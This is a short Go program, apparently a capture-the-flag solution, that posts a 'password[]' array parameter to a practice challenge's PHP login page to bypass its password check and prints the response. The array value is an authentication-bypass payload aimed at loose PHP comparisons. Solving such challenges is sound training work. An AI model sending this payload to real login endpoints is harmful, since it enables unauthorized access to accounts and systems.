package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
)

func main() {
	Url := "http://ctfq.sweetduet.info:10080/~q32/auth.php"
	param := url.Values{}
	param.Set("password[]", "a")
	resp, err := http.PostForm(Url, param)
	if err != nil {
		fmt.Println(err)
	}
	defer resp.Body.Close()
	text, _ := ioutil.ReadAll(resp.Body)
	fmt.Println(string(text))
}
